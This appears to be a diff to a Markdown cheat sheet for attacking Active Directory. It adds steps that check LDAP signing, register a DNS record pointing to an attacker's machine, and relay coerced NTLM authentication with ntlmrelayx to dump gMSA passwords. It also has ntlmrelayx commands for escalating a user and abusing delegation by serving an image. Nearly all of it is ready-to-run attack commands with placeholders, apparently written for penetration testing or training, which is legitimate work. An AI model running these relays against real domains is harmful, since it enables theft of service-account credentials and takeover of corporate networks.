@@ -538,13 +538,37 @@ Get-DomainObjectAcl -Identity "<OBJECT FQDN OR SID>" -ResolveGUIDs | Where-Objec
 ```
 
 ### Relaying ReadGMSAPassword
+#### Check LDAP Signing and LDAPS Binding
+- https://github.com/zyn3rgy/LdapRelayScan
+```
+python3 LdapRelayScan.py -method BOTH -dc-ip <IP> -u <USER> -p <PASSWORD>
+
+cme ldap <DC IP> -u <USER> -p <PASSWORD> -M ldap-checker
+```
+
+#### Create a DNS record pointing to the attacker's machine IP
+- https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
+- https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
+```
+dnstool.py -u <DOMAIN>\<USER> -a add -r <HOSTNAME> -d <ATTACKER IP> <DC IP>
+
+$creds = get-credential
+Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> -Credential $creds -Realm <DOMAIN>
+```
+
+#### Start NTLMRelay
 - Can either relay to `ldap` or `ldaps`
 ```
 sudo python3 ntlmrelayx.py -t ldap://<DC> --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs
 ```
 
+#### Force auth
+- [Change lockscreen image](#Change-lockscreen-image)
+- [Coercing](#Trigger-target-to-authenticate-to-attacker-machine)
+
 ### NTLMRelay
 - It is possible to abuse ACL with NTLMRelay abuse
+
 ```
 ntlmrelayx.py -t ldap://<DC IP> --escalate-user <USER>
 ```
@@ -899,8 +923,6 @@ Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccount
 dir \\<COMPUTER>\C$
 ```
 
-- If dir doesn't work check blogpost
-
 #### It is possible that you impersonated another user which leads to more ACL abuses!
 
 ### Webclient Attack
@@ -1050,7 +1072,7 @@ Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> 
 ```
 - Didn't test dnstool for this attack
 
-#### Serve image with impacket
+#### Start NTLMRelay
 - Can either relay to `ldap` or `ldaps`
 ```
 sudo python3 ntlmrelayx.py -t ldap://<DC> --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg --http-port 8080
